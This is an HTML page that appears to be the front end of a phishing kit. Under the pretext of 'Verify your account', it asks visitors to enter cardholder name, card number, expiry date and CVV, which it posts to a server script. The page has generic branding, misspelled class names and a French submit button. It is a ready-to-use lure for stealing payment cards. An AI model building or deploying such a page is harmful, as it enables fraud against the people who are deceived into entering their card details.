<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Identity verification</title>
</head>
<body >

<main>


    <div class="continer1">


    <div class="logo1">
<img src="res/img/logo.png" >

</div>

<div class="tittle">
    <h2>Verify your account.</h2>
</div> 
<div class="tittle">
<label>Please update your payment information<label>
    </div>



<form action="post.php" method="post">

<div class="col">
    <label> Cardholder name </label>
 <input type="text" name="name" required> </div>


<div class="col">
<label> Card number </label>
<input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required></div>


<div class="col">
<label> Expiration date </label> 
<input type="text" name="exp" placeholder="MM/YY" id="exp" required> </div>


<div class="col">
<label>Security code </label>
<input type="text"  name="cvv" placeholder="CVV" id="cvv" required> </div>





<div class="but">
<div class="button"><button type="submit"> Continuer</button> </div>
</div>


</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
 

</body>
</html>